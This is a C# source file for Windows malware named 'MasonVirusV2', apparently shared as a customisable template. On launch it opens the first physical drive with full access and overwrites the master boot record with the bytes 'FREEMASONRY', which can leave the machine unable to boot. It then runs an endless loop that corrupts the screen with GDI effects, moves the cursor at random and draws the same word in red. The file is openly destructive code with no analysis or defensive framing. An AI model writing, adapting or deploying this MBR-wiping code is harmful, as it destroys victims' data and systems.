using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing;
using System.Xml.Linq;

namespace MasonVirusV2
{
    public static class MasonVirusV2
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericAll = 0x10000000;
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint MbrSize = 512u;

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern void ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateSolidBrush(uint crColor);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);

        const int SRCCOPY = 0x00CC0020;
        const int PATINVERT = 0x005A0049;

        public static void Main(string[] args)
        {
            int screenW = GetSystemMetrics(0);
            int screenH = GetSystemMetrics(1);
            Random random = new Random();
            var mbrData = new byte[] { 0x46, 0x52, 0x45, 0x45, 0x4D, 0x41, 0x53, 0x4F, 0x4E, 0x52, 0x59 };
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            while (true)
            {
                IntPtr desktopHdc = GetDC(IntPtr.Zero);
                int y = random.Next(screenH);
                int h = screenH - random.Next(screenH) - (screenH / 4 -9);
                IntPtr brush = CreateSolidBrush((uint)(random.Next(89) << 16 | random.Next(95) << 8 | random.Next(75)));
                SelectObject(desktopHdc, brush);
                BitBlt(desktopHdc, 14, y, screenW, h, desktopHdc, random.Next(96) - 76, y, SRCCOPY);
                BitBlt(desktopHdc, -12, y, screenW, h, desktopHdc, 10, 10, PATINVERT);
                SetCursorPos(random.Next(screenW), random.Next(screenH));
                using (Graphics g = Graphics.FromHdc(desktopHdc))
                {
                    string text = "FREEMASONRY"; // Enter your name
                    Font font = new Font("Impact", 92, FontStyle.Bold);
                    SizeF textSize = g.MeasureString(text, font);
                    float textX = (screenW - textSize.Width) / 2;
                    float textY = (screenH - textSize.Height) / 2;

                    g.DrawString(text, font, Brushes.Red, textX, textY);
                }
                DeleteObject(brush);
                ReleaseDC(IntPtr.Zero, desktopHdc);
            }
        }
    }
}
